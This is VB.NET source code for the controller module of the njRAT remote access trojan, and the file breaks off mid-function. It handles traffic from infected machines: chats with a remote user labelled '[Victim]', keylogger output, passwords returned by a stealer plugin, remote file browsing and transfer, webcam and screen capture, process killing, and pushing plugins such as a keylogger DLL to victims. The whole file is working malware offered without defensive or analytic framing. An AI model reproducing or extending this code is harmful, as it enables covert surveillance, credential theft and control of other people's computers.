Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Threading
Imports System.Windows.Forms
Imports System.Windows.Forms.ListView
Imports System.Security.Cryptography
Imports System.IO.Compression

Namespace njRAT
    <StandardModule> _
    Friend NotInheritable Class ind
        ' Methods
        Public Shared Function GETPLG(Optional ByVal Name As String = Nothing, Optional ByVal Hash As String = Nothing) As plg
            If (Not Name Is Nothing) Then
                Dim plg2 As plg
                For Each plg2 In ind.Plug
                    If (plg2.Name = Name.ToLower) Then
                        Return plg2
                    End If
                Next
            End If
            If (Not Hash Is Nothing) Then
                Dim plg As plg
                Using enumerator2 As IEnumerator(Of plg) = ind.Plug.GetEnumerator
                    Dim current As plg
                    Do While enumerator2.MoveNext
                        current = enumerator2.Current
                        If (current.Hash = Hash) Then
                            GoTo Label_0082
                        End If
                    Loop
                    GoTo Label_0096
Label_0082:
                    plg = current
                End Using
                Return plg
            End If
Label_0096:
            Return Nothing
        End Function

        Public Shared Function Gform(ByVal name As String) As Form
            Return My.Application.OpenForms.Item(name)
        End Function

        Public Shared Sub Log(ByVal T As String)
            ind.LG.Add((FN.HM & T))
        End Sub

        Public Shared Sub Req(ByVal obj As Object)
            Dim c As Client = DirectCast(NewLateBinding.LateIndexGet(obj, New Object() {0}, Nothing), Client)
            Dim b As Byte() = DirectCast(NewLateBinding.LateIndexGet(obj, New Object() {1}, Nothing), Byte())
            Dim strArray As String() = Strings.Split(FN.BS(b), ind.Y, -1, CompareMethod.Binary)
            Try
                Dim item4 As ListViewItem
                Dim strArray9 As String()
                Dim bar As ProgressBar
                Dim bar3 As ToolStripProgressBar
                Dim str4 As String = strArray(0)
                If (str4 = "CH") Then
                    If (c.L Is Nothing) Then
                        c.L = New ListViewItem
                    End If
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        Dim chat As Chat = DirectCast(ind.Gform(("ch" & c.ip)), Chat)
                        Select Case strArray(2)
                            Case "~"
                                If (chat Is Nothing) Then
                                    chat = New Chat
                                    chat.Name = ("ch" & c.ip)
                                    chat.sk = c
                                    chat.osk = ind.W.GetClient(strArray(1))
                                    chat.T2.Enabled = False
                                    chat.Button1.Enabled = False
                                    chat.Show()
                                End If
                                Exit Select
                            Case "!"
                                chat.T2.Enabled = True
                                chat.Button1.Enabled = True
                                Dim chat2 As Chat = chat
                                SyncLock chat2
                                    chat.T1.AppendText("Connected .." & ChrW(13) & ChrW(10))
                                    Exit Select
                                End SyncLock
                                Exit Select
                            Case "@"
                                Dim chat3 As Chat = chat
                                SyncLock chat3
                                    chat.T1.SelectionStart = chat.T1.TextLength
                                    chat.T1.SelectionFont = New Font(chat.T1.Font, FontStyle.Bold)
                                    chat.T1.AppendText("[Victim] ")
                                    chat.T1.SelectionFont = chat.T1.Font
                                    chat.T1.AppendText((FN.DEB(strArray(3)) & ChrW(13) & ChrW(10)))
                                    chat.T1.SelectionStart = chat.T1.TextLength
                                    chat.T1.ScrollToCaret()
                                End SyncLock
                                Exit Select
                        End Select
                    End If
                    Return
                End If
                If (str4 = "kla") Then
                    Dim kl As kl = DirectCast(ind.Gform(("kl" & c.ip)), kl)
                    kl.L1.Items.Clear()
                    kl.T1.Text = ""
                    Dim str As String
                    For Each str In Strings.Split(FN.DEB(strArray(1)), ChrW(13) & ChrW(10), -1, CompareMethod.Binary)
                        kl.insert(str)
                    Next
                    kl.L1.FX()
                    Return
                End If
                If (str4 = "kl") Then
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        If (ind.Gform(("kl" & c.ip)) Is Nothing) Then
                            Dim kl2 As New kl
                            kl2.c = c
                            kl2.Name = ("kl" & c.ip)
                            kl2.Text = Conversions.ToString(ind.vno(c.L))
                            kl2.Show()
                        End If
                        Dim dz As New Thread(New ParameterizedThreadStart(AddressOf ind.Req))
                        dz.Start(New Object() {c, FN.SB(("kla" & ind.Y & strArray(1)))})
                    End If
                    Return
                End If
                If (str4 = "ret") Then
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        Dim str7 As String = strArray(1)
                        If (str7 = ind.GETPLG("pw.dll", Nothing).Hash) Then
                            Dim pass As Pass = DirectCast(ind.Gform("Pass"), Pass)
                            If (pass Is Nothing) Then
                                pass = New Pass
                                pass.Show()
                            End If
                            pass.XD(c, FN.DEB(strArray(2)))
                        End If
                    End If
                    Return
                End If
                If (str4 = "inf") Then
                    Dim sinf As sinf = DirectCast(ind.Gform(("inf" & c.ip)), sinf)
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                    Else
                        If (sinf Is Nothing) Then
                            sinf = New sinf
                            sinf.Name = ("inf" & c.ip)
                            sinf.Text = (c.L.Text & "/" & c.ip)
                            sinf.Show()
                        End If
                        sinf.L1.Items.Clear()
                        Dim num11 As Integer = (strArray.Length - 1)
                        Dim i As Integer = 1
                        Do While (i <= num11)
                            Select Case i
                                Case 1
                                    sinf.L1.Items.Add("Server ID").SubItems.Add(FN.DEB(strArray(i)))
                                    Exit Select
                                Case 2
                                    sinf.L1.Items.Add("Dns").SubItems.Add(strArray(i))
                                    Exit Select
                                Case 3
                                    sinf.L1.Items.Add("Folder").SubItems.Add(("%" & strArray(i) & "%"))
                                    Exit Select
                                Case 4
                                    sinf.L1.Items.Add("ExeName").SubItems.Add(strArray(i))
                                    Exit Select
                                Case 5
                                    sinf.L1.Items.Add("Process").SubItems.Add(strArray(i))
                                    Exit Select
                            End Select
                            i += 1
                        Loop
                        sinf.L1.Columns.Item(0).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                        sinf.L1.Columns.Item(1).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End If
                    Return
                End If
                If (str4 = "dw") Then
                    Dim dw As DW = DirectCast(ind.Gform((c.ip & strArray(1))), DW)
                    If (dw Is Nothing) Then
                        c.Send(("close" & ind.Y & strArray(1)))
                    Else
                        Dim array As Byte() = DirectCast(NewLateBinding.LateIndexGet(FN.fx(b, ("dw" & ind.Y & strArray(1) & ind.Y)), New Object() {1}, Nothing), Byte())
                        dw.FS.Write(array, 0, array.Length)
                        dw.FS.Flush()
                        bar = dw.ProgressBar1
                        bar.Value = (bar.Value + array.Length)
                        If (dw.FS.Length = dw.SZ) Then
                            dw.FS.Close()
                            c.Send(("close" & ind.Y & strArray(1)))
                            dw.Button1.Text = "Save"
                        Else
                            c.Send(("de" & ind.Y & strArray(1)))
                        End If
                    End If
                    Return
                End If
                If (str4 = "up") Then
                    Dim up As up = DirectCast(ind.Gform((c.ip & strArray(1))), up)
                    If (up Is Nothing) Then
                        c.Send(("close" & ind.Y & strArray(1)))
                    ElseIf (up.ProgressBar1.Value = up.ProgressBar1.Maximum) Then
                        c.Send(("close" & ind.Y & strArray(1)))
                        up.FS.Close()
                        up.FS.Dispose()
                        up.Close()
                    Else
                        Dim buffer3 As Byte() = New Byte(&H1401 - 1) {}
                        Dim count As Integer = up.FS.Read(buffer3, 0, buffer3.Length)
                        bar = up.ProgressBar1
                        bar.Value = (bar.Value + count)
                        Dim stream As New MemoryStream
                        Dim s As String = ("wd" & ind.Y & strArray(1) & ind.Y)
                        stream.Write(FN.SB(s), 0, s.Length)
                        stream.Write(buffer3, 0, count)
                        c.Send(stream.ToArray)
                        stream.Dispose()
                    End If
                    Return
                End If
                If (str4 = "FM") Then
                    If (c.L Is Nothing) Then
                        c.L = New ListViewItem
                    End If
                    Dim fm As FM = DirectCast(ind.Gform(("fm" & c.ip)), FM)
                    Dim str8 As String = strArray(2)
                    If (str8 = "dw") Then
                        If ind.F.InvokeRequired Then
                            ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                        Else
                            Dim dw2 As New DW
                            dw2.FNn = strArray(3)
                            dw2.SZ = Conversions.ToInteger(strArray(4))
                            dw2.c = c
                            dw2.ProgressBar1.Maximum = dw2.SZ
                            dw2.Show()
                            c.Send(("de" & ind.Y & dw2.FNn))
                        End If
                    ElseIf (str8 = "~") Then
                        If (fm Is Nothing) Then
                            If ind.F.InvokeRequired Then
                                ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                fm = New FM
                                fm.sk = c
                                fm.osk = ind.W.GetClient(strArray(1))
                                fm.Name = ("fm" & c.ip)
                                fm.Show()
                            End If
                        End If
                    ElseIf (str8 = "!") Then
                        fm.L1.Items.Clear()
                        Dim num13 As Integer = (strArray.Length - 1)
                        Dim j As Integer = 3
                        Do While (j <= num13)
                            Dim strArray3 As String() = Strings.Split(FN.DEB(strArray(j)), ";", -1, CompareMethod.Binary)
                            Dim info As New DirectoryInfo(strArray3(0))
                            Dim item As ListViewItem = fm.L1.Items.Add(info.Name)
                            item.ToolTipText = info.FullName
                            item.SubItems.Add(strArray3(1))
                            Dim str9 As String = strArray3(1)
                            If (str9 = DriveType.Fixed.ToString) Then
                                item.ImageIndex = 1
                            ElseIf (str9 = DriveType.Removable.ToString) Then
                                item.ImageIndex = 3
                            ElseIf (str9 = DriveType.CDRom.ToString) Then
                                item.ImageIndex = 2
                            Else
                                item.ImageIndex = 0
                                item.SubItems.Item(1).Text = "DIR"
                            End If
                            j += 1
                        Loop
                        fm.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Else
                        If (str8 = "@") Then
                            Dim pr As ToolStripProgressBar = fm.pr
                            SyncLock pr
                                If fm.Cache.Contains(FN.DEB(strArray(3))) Then
                                    fm.Cache.Remove(FN.DEB(strArray(3)))
                                End If
                                Dim mcach As New FMcach
                                mcach.Path = FN.DEB(strArray(3))
                                fm.Cache.Add(mcach, mcach.Path, Nothing, Nothing)
                                Dim info2 As New DirectoryInfo(FN.DEB(strArray(3)))
                                If (fm.TextBox1.Text = info2.FullName) Then
                                    fm.pr.Value = 0
                                    Dim strArray4 As String() = Strings.Split(strArray(4), "/", -1, CompareMethod.Binary)
                                    fm.pr.Maximum = (strArray4.Length - 1)
                                    fm.L2.Items.Clear()
                                    If (Not info2.Parent Is Nothing) Then
                                        Dim item5 As ListViewItem = fm.L2.Items.Add("..", "..", 0)
                                        item5.ToolTipText = info2.Parent.FullName
                                        item5.SubItems.Add("")
                                        item5.SubItems.Add("DIR")
                                        item5 = Nothing
                                    End If
                                    fm.MG2.Images.Clear()
                                    fm.MG2.Images.Add(fm.MG.Images.Item(0))
                                    fm.MG2.Images.Add("*", fm.MG.Images.Item(4))
                                    Dim num14 As Integer = (strArray4.Length - 2)
                                    Dim k As Integer = 0
                                    Do While (k <= num14)
                                        If (fm.TextBox1.Text <> info2.FullName) Then
                                            Return
                                        End If
                                        Dim item6 As ListViewItem = fm.L2.Items.Add((info2.FullName & FN.DEB(strArray4(k))), FN.DEB(strArray4(k)), 0)
                                        item6.SubItems.Add("")
                                        item6.SubItems.Add("DIR")
                                        item6.ToolTipText = (info2.FullName & item6.Text)
                                        mcach.folders.Add(item6.ToolTipText)
                                        item6 = Nothing
                                        bar3 = fm.pr
                                        bar3.Value += 1
                                        k += 1
                                    Loop
                                    fm.TextBox1.BackColor = Color.Gainsboro
                                    fm.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    c.Send(("@" & ind.Y & strArray(3)))
                                    fm.pr.Value = 0
                                End If
                                Return
                            End SyncLock
                        End If
                        If (str8 = "#") Then
                            Dim bar4 As ToolStripProgressBar = fm.pr
                            SyncLock bar4
                                Dim mcach2 As FMcach = DirectCast(fm.Cache.Item(FN.DEB(strArray(3))), FMcach)
                                Dim str3 As String = FN.DEB(strArray(3))
                                If (fm.TextBox1.Text = str3) Then
                                    fm.pr.Value = 0
                                    Dim strArray5 As String() = Strings.Split(strArray(4), "/", -1, CompareMethod.Binary)
                                    fm.pr.Maximum = (strArray5.Length - 1)
                                    Dim num15 As Integer = (strArray5.Length - 2)
                                    Dim m As Integer = 0
                                    Do While (m <= num15)
                                        Dim strArray6 As String() = Strings.Split(FN.DEB(strArray5(m)), ";", -1, CompareMethod.Binary)
                                        If (fm.TextBox1.Text <> str3) Then
                                            Return
                                        End If
                                        Dim item7 As ListViewItem = fm.L2.Items.Add((str3 & strArray6(0)), strArray6(0), 1)
                                        Dim info3 As New FileInfo((str3 & strArray6(0)))
                                        item7.ToolTipText = info3.FullName
                                        item7.SubItems.Add(FN.siz(strArray6(1)))
                                        If (info3.Extension = "") Then
                                            item7.SubItems.Add("")
                                        Else
                                            item7.SubItems.Add(info3.Extension.Replace(".", ""))
                                            If Not fm.MG2.Images.ContainsKey(info3.Extension) Then
                                                File.Create((Application.StartupPath & "\!" & info3.Extension)).Close()
                                                fm.MG2.Images.Add(info3.Extension, Icon.ExtractAssociatedIcon((Application.StartupPath & "\!" & info3.Extension)))
                                                File.Delete((Application.StartupPath & "\!" & info3.Extension))
                                                item7.ImageKey = info3.Extension
                                            Else
                                                item7.ImageKey = info3.Extension
                                            End If
                                        End If
                                        mcach2.files.Add(String.Concat(New String() {item7.ToolTipText, ";", item7.SubItems.Item(1).Text, ";", item7.SubItems.Item(2).Text}))
                                        item7 = Nothing
                                        bar3 = fm.pr
                                        bar3.Value += 1
                                        m += 1
                                    Loop
                                    fm.TextBox1.BackColor = Color.WhiteSmoke
                                    fm.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                                    fm.pr.Value = 0
                                End If
                                Return
                            End SyncLock
                        End If
                        If (str8 = "$") Then
                            If ind.F.InvokeRequired Then
                                ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                If fm.Images.Contains(FN.DEB(strArray(3))) Then
                                    fm.Images.Remove(FN.DEB(strArray(3)))
                                End If
                                fm.Images.Add(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(4)))), FN.DEB(strArray(3)), Nothing, Nothing)
                                If (fm.L2.Items.ContainsKey(FN.DEB(strArray(3))) AndAlso fm.L2.Items.Item(FN.DEB(strArray(3))).Selected) Then
                                    fm.P.Image = DirectCast(fm.Images.Item(FN.DEB(strArray(3))), Image)
                                    fm.P.Visible = True
                                End If
                            End If
                        ElseIf (str8 = "%") Then
                            If ind.F.InvokeRequired Then
                                ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Else
                                Dim note As New Note
                                note.FN = FN.DEB(strArray(3))
                                note.Text = (fm.QQ & " - " & note.FN)
                                note.SK = fm.sk
                                note.TextBox1.Text = FN.DEB(strArray(4)).Replace(ChrW(0), "")
                                note.Show()
                                note.ToolStripMenuItem1.Enabled = False
                            End If
                        ElseIf (str8 = "dl") Then
                            Dim enumerator As IEnumerator
                            Dim strArray7 As String() = Strings.Split(FN.DEB(strArray(3)), ";", -1, CompareMethod.Binary)
                            Try
                                Dim current As ListViewItem
                                enumerator = fm.L2.Items.GetEnumerator
                                Do While enumerator.MoveNext
                                    current = DirectCast(enumerator.Current, ListViewItem)
                                    If (strArray7(1) = "*") Then
                                        If Not ((current.Text = New DirectoryInfo(strArray7(0)).Name) And (current.SubItems.Item(2).Text = "DIR")) Then
                                            Continue Do
                                        End If
                                        GoTo Label_14FE
                                    End If
                                    If ((current.Text = New DirectoryInfo(strArray7(0)).Name) And (current.SubItems.Item(2).Text <> "DIR")) Then
                                        GoTo Label_1507
                                    End If
                                Loop
                                Return
Label_14FE:
                                current.Remove()
                                Return
Label_1507:
                                current.Remove()
                            Finally
                                If TypeOf enumerator Is IDisposable Then
                                    TryCast(enumerator, IDisposable).Dispose()
                                End If
                            End Try
                        Else
                            If (str8 = "nm") Then
                                Dim enumerator2 As IEnumerator
                                Dim strArray8 As String() = Strings.Split(FN.DEB(strArray(3)), ";", -1, CompareMethod.Binary)
                                Try
                                    enumerator2 = fm.L2.Items.GetEnumerator
                                    Do While enumerator2.MoveNext
                                        Dim item3 As ListViewItem = DirectCast(enumerator2.Current, ListViewItem)
                                        If (item3.ToolTipText = strArray8(0)) Then
                                            If (strArray8(2) = "*") Then
                                                Dim info4 As New DirectoryInfo(strArray8(0))
                                                item3.Text = strArray8(1)
                                                item3.ToolTipText = (info4.Parent.FullName & "\" & item3.Text)
                                            Else
                                                Dim info5 As New FileInfo(strArray8(0))
                                                item3.Text = strArray8(1)
                                                item3.ToolTipText = (info5.Directory.FullName & Conversions.ToString(CDbl((Conversions.ToDouble("\") * Conversions.ToDouble(item3.Text)))))
                                                item3.SubItems.Item(2).Text = New FileInfo(item3.ToolTipText).Extension.Replace(".", "")
                                            End If
                                        End If
                                    Loop
                                    Return
                                Finally
                                    If TypeOf enumerator2 Is IDisposable Then
                                        TryCast(enumerator2, IDisposable).Dispose()
                                    End If
                                End Try
                            End If
                            If (str8 = "ER") Then
                                fm.SL.Text = ("Error " & strArray(4))
                            End If
                        End If
                    End If
                    Return
                End If
                If (str4 = "CAM") Then
                    If (c.L Is Nothing) Then
                        c.L = New ListViewItem
                    End If
                    Dim cam As Cam = DirectCast(ind.Gform(("cam" & c.ip)), Cam)
                    Select Case strArray(2)
                        Case "~"
                            If (cam Is Nothing) Then
                                If ind.F.InvokeRequired Then
                                    ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                                    Exit Select
                                End If
                                cam = New Cam
                                cam.sk = c
                                cam.osk = ind.W.GetClient(strArray(1))
                                cam.Name = ("cam" & c.ip)
                                cam.Show()
                            End If
                            Dim num16 As Integer = (strArray.Length - 1)
                            Dim n As Integer = 3
                            Do While (n <= num16)
                                cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(strArray(n))
                                n += 1
                            Loop
                            Exit Select
                        Case "!"
                            If (strArray(3) <> "!") Then
                                cam.PictureBox1.Image = Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(3))))
                                cam.Text = (cam.QQ & " Size: " & FN.siz(Conversions.ToString(strArray(3).Length)))
                            End If
                            If (cam.Button1.Text = "Stop") Then
                                c.Send(String.Concat(New String() {"!", ind.Y, Conversions.ToString(cam.ComboBox1.SelectedIndex), ind.Y, "160,120"}))
                            Else
                                c.Send("@")
                            End If
                            Exit Select
                    End Select
                    Return
                End If
                If (str4 = "RDP") Then
                    If (c.L Is Nothing) Then
                        c.L = New ListViewItem
                    End If
                    Dim cap As cap = DirectCast(ind.Gform(("rdp" & c.ip)), cap)
                    If (cap Is Nothing) Then
                        If ind.F.InvokeRequired Then
                            ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                            Return
                        End If
                        cap = New cap
                        cap.sk = c
                        cap.osk = ind.W.GetClient(strArray(1))
                        cap.Name = ("rdp" & c.ip)
                    End If
                    Dim box As PictureBox = cap.P1
                    SyncLock box
                        Select Case strArray(2)
                            Case "~"
                                cap.SZ = New Size(Conversions.ToInteger(strArray(3)), Conversions.ToInteger(strArray(4)))
                                cap.Show()
                                Exit Select
                            Case "!"
                                If (Not cap Is Nothing) Then
                                    If ((strArray.Length = 3) Or (strArray(3) = ChrW(0))) Then
                                        cap.Text = (cap.QQ & " Size: x ,Changes: ".Replace("x", FN.siz(Conversions.ToString(b.Length))) & "0")
                                        If (cap.Button1.Text = "Stop") Then
                                            c.Send(String.Concat(New String() {"!", ind.Y, Conversions.ToString(cap.ComboBox1.SelectedIndex), ind.Y, cap.ComboBox2.Text, ind.Y, Conversions.ToString(cap.c.Value)}))
                                        End If
                                    Else
                                        cap.PktToImage(DirectCast(NewLateBinding.LateIndexGet(FN.fx(b, String.Concat(New String() {strArray(0), ind.Y, strArray(1), ind.Y, strArray(2), ind.Y})), New Object() {1}, Nothing), Byte()))
                                    End If
                                ElseIf (Not c Is Nothing) Then
                                    c.CN = False
                                End If
                                Exit Select
                        End Select
                        Return
                    End SyncLock
                End If
                If (str4 <> "proc") Then
                    GoTo Label_1F43
                End If
                If (c.L Is Nothing) Then
                    c.L = New ListViewItem
                End If
                Dim proc As proc = DirectCast(ind.Gform(("proc" & c.ip)), proc)
                If (proc Is Nothing) Then
                    If ind.F.InvokeRequired Then
                        ind.F.Invoke(New _Req(AddressOf ind.Req), New Object() {RuntimeHelpers.GetObjectValue(obj)})
                        Return
                    End If
                    proc = New proc
                    proc.sk = c
                    proc.osk = ind.W.GetClient(strArray(1))
                    proc.Name = ("proc" & c.ip)
                    proc.Show()
                End If
                If (strArray.Length <= 2) Then
                    Return
                End If
                Dim str12 As String = strArray(2)
                If (str12 = "pid") Then
                    proc.ID = Conversions.ToInteger(strArray(3))
                    Return
                End If
                If (str12 = "~") Then
                    proc.L1.Items.Clear()
                    proc.pr.Value = 0
                    proc.pr.Maximum = Conversions.ToInteger(strArray(3))
                    Return
                End If
                If (str12 <> "!") Then
                    GoTo Label_1E0D
                End If
                Dim num17 As Integer = (strArray.Length - 1)
                Dim index As Integer = 3
Label_1C9C:
                If (index > num17) Then
                    GoTo Label_1D97
                End If
                Try
                    bar3 = proc.pr
                    bar3.Value += 1
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    ProjectData.ClearProjectError()
                End Try
                GoTo Label_1D17
Label_1CCE:
                item4.ForeColor = Color.Red
Label_1CDA:
                If strArray9(0).Contains(":\") Then
                    item4.SubItems.Add(strArray9(0))
                Else
                    item4.SubItems.Add("")
                End If
                index += 1
                GoTo Label_1C9C
Label_1D17:
                strArray9 = Strings.Split(strArray(index), ",", -1, CompareMethod.Binary)
                item4 = proc.L1.Items.Add(strArray9(1).ToString, Strings.Split(strArray9(0), "\", -1, CompareMethod.Binary)((Strings.Split(strArray9(0), "\", -1, CompareMethod.Binary).Length - 1)), 0)
                item4.SubItems.Add(strArray9(1))
                If (Conversions.ToDouble(strArray9(1)) <> proc.ID) Then
                    GoTo Label_1CDA
                End If
                GoTo Label_1CCE
Label_1D97:
                proc.pr.Visible = False
                proc.L1.FX()
                proc.L1.ColumnClick(proc.L1, New ColumnClickEventArgs(0))
                If proc.L1.Columns.Item(0).Text.StartsWith("-") Then
                    proc.L1.ColumnClick(proc.L1, New ColumnClickEventArgs(0))
                End If
                Return
Label_1E0D:
                If (str12 = "RM") Then
                    proc.SL.Text = (proc.L1.Items.Item(strArray(3)).Text & "[" & strArray(3) & "] Killed")
                    proc.L1.Items.Item(strArray(3)).Remove()
                ElseIf (str12 = "ER") Then
                    proc.SL.Text = String.Concat(New String() {"[proc.dll] Error At [", strArray(3), "] MSG=[", strArray(4), "]"})
                    ind.Log(String.Concat(New String() {"[proc.dll] Error At [", strArray(3), "] Client=[", proc.osk.ip, "/", proc.osk.L.Text, "] MSG=[", strArray(4), "]"}))
                End If
                Return
Label_1F43:
                If (str4 = "lv") Then
                    Dim items As ListViewItemCollection = ind.F.L1.Items
                    Monitor.Enter(items)
                    Try
                        If (Not c.L Is Nothing) Then
                            c.L.Remove()
                        End If
                        c.L = ind.F.L1.Items.Add(c.ip, FN.DEB(strArray(1)), 0)
                        c.L.ToolTipText = c.ip
                        c.L.Tag = c
                        c.L.SubItems.Add(Strings.Split(c.ip, ":", -1, CompareMethod.Binary)(0))
                        Dim num18 As Integer = (strArray.Length - 2)
                        Dim num8 As Integer = 2
                        Do While (num8 <= num18)
                            Dim num19 As Integer = num8
                            If (num19 = ind.hac) Then
                                c.L.SubItems.Add(FN.DEB(strArray(num8)))
                            ElseIf (num19 = ind.hco) Then
                                If (ind.F.L1.SmallImageList Is ind.F.IMG2) Then
                                    If Not ind.F.IMG2.Images.ContainsKey((strArray(num8) & ".png")) Then
                                        c.L.ImageKey = "X.png"
                                    Else
                                        c.L.ImageKey = (strArray(num8) & ".png")
                                    End If
                                Else
                                    c.L.ImageKey = "s"
                                End If
                                c.L.SubItems.Add(strArray(num8))
                            Else
                                c.L.SubItems.Add(strArray(num8))
                            End If
                            num8 += 1
                        Loop
                        c.plg.AddRange(Strings.Split(strArray((strArray.Length - 1)), ",", -1, CompareMethod.Binary))
                    Catch exception6 As Exception
                        ProjectData.SetProjectError(exception6)
                        ProjectData.ClearProjectError()
                    Finally
                        Monitor.Exit(items)
                    End Try
                    ind.Log(("Logged " & c.ip & " " & FN.DEB(strArray(1))))
                    If (My.Application.OpenForms.Count < 10) Then
                        ind.F.Invoke(New _shw(AddressOf ind.shw), New Object() {c})
                    End If
                    c.plg.Contains("kl")
                    If (c.L.SubItems.Item(ind.hvr).Text <> "0.2.7") Then
                    End If
                Else
                    If (str4 = "P") Then
                        If ((c.L Is Nothing) OrElse (c.L.SubItems.Count <= ind.hping)) Then
                            Return
                        End If
                        Dim items2 As ListViewItemCollection = ind.F.L1.Items
                        SyncLock items2
                            c.L.SubItems.Item(ind.hping).Text = (strArray(1) & "ms")
                            Return
                        End SyncLock
                    End If
                    If (str4 = "bla") Then
                        c.L.ForeColor = Color.Black
                    ElseIf (str4 = "~") Then
                        c.Send("~")
                    ElseIf (str4 = "ER") Then
                        ind.Log(String.Concat(New String() {"Error From [", c.ip, "/", c.L.Text, "] At [", strArray(1), "] MSG [", strArray(2), "]"}))
                    ElseIf (str4 = "!") Then
                        If (Not c Is Nothing) Then
                            c.plg.Clear()
                            If (Not c.L Is Nothing) Then
                                Dim items3 As ListViewItemCollection = ind.F.L1.Items
                                SyncLock items3
                                    ind.F.L1.Items.Remove(c.L)
                                End SyncLock
                            End If
                            Dim smallImageList As ImageList = ind.F.L1.SmallImageList
                            SyncLock smallImageList
                                ind.F.IMG.Images.RemoveByKey(c.ip)
                            End SyncLock
                        End If
                    ElseIf (str4 = "pl") Then
                        Try
                            c.plg.Remove(strArray(1))
                        Catch exception7 As Exception
                            ProjectData.SetProjectError(exception7)
                            ProjectData.ClearProjectError()
                        End Try
                        If (strArray(2).ToString = "0") Then
                            c.plg.Add(strArray(1))
                        Else
                            ind.SendPlug(c, ind.GETPLG(Nothing, strArray(1)), Conversions.ToBoolean(strArray(2)))
                        End If
                    Else
                        If (str4 = "CAP") Then
                            Dim list2 As ImageList = ind.F.L1.SmallImageList
                            SyncLock list2
                                c.Isend = False
                                If Not ind.F.IMG.Images.ContainsKey(c.ip) Then
                                    ind.F.IMG.Images.Add(c.ip, Image.FromStream(New MemoryStream(DirectCast(NewLateBinding.LateIndexGet(FN.fx(b, ind.Y), New Object() {1}, Nothing), Byte()))))
                                Else
                                    Dim num9 As Integer = ind.F.IMG.Images.IndexOfKey(c.ip)
                                    ind.F.IMG.Images.Add(c.ip, Image.FromStream(New MemoryStream(DirectCast(NewLateBinding.LateIndexGet(FN.fx(b, ind.Y), New Object() {1}, Nothing), Byte()))))
                                    ind.F.IMG.Images.RemoveAt(num9)
                                End If
                                If (ind.F.L1.SmallImageList Is ind.F.IMG) Then
                                    c.L.ImageKey = ""
                                    c.L.ImageKey = c.ip
                                End If
                                Return
                            End SyncLock
                        End If
                        If (str4 = "act") Then
                            Dim items4 As ListViewItemCollection = ind.F.L1.Items
                            SyncLock items4
                                If (Not c.L Is Nothing) Then
                                    c.L.SubItems.Item(ind.hac).Text = FN.DEB(strArray(1))
                                End If
                            End SyncLock
                        End If
                    End If
                End If
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception4 As Exception = exception8
                If ((strArray(0) = "up") Or (strArray(0) = "dw")) Then
                    Try
                        c.Send(("close" & ind.Y & strArray(1)))
                    Catch exception9 As Exception
                        ProjectData.SetProjectError(exception9)
                        ProjectData.ClearProjectError()
                    End Try
                    ProjectData.ClearProjectError()
                Else
                    ind.Log(String.Concat(New String() {"Listner Error At[", strArray(0), "] MSG[", exception4.Message, "]"}))
                    ProjectData.ClearProjectError()
                End If
            End Try
        End Sub

        Public Shared Function SendPlug(ByVal c As Client, ByVal p As plg, ByVal ret As Boolean) As Boolean
            Try
                Dim str As String
                If ret Then
                    str = ("ret" & ind.Y & p.Hash & ind.Y)
                Else
                    str = String.Concat(New String() {"inv", ind.Y, p.Hash, ind.Y, c.ip, ind.Y})
                End If
                Dim stream As New MemoryStream
                If (p.Name = "kl.dll") Then
                    str = str.Replace(p.Hash, "kl")
                    stream.Write(FN.SB(str), 0, str.Length)
                    stream.Write(p.B, 0, p.B.Length)
                Else
                    stream.Write(FN.SB(str), 0, str.Length)
                    If Not c.plg.Contains(p.Hash) Then
                        stream.Write(p.B, 0, p.B.Length)
                    Else
                        stream.WriteByte(40)
                    End If
                End If
                c.Send(stream.ToArray)
                stream.Dispose()
                Return True
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
            Return False
        End Function

        Public Shared Sub SendTo(ByVal O As Object)
            Dim items As SelectedListViewItemCollection = DirectCast(NewLateBinding.LateIndexGet(O, New Object() {0}, Nothing), SelectedListViewItemCollection)
            Try
                Dim enumerator As IEnumerator
                Try
                    enumerator = items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Dim objArray2 As Object() = New Object(1 - 1) {}
                        Dim arguments As Object() = New Object(1 - 1) {}
                        Dim num As Integer = 1
                        arguments(0) = 1
                        objArray2(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(O, arguments, Nothing))
                        Dim objArray3 As Object() = objArray2
                        Dim copyBack As Boolean() = New Boolean() {True}
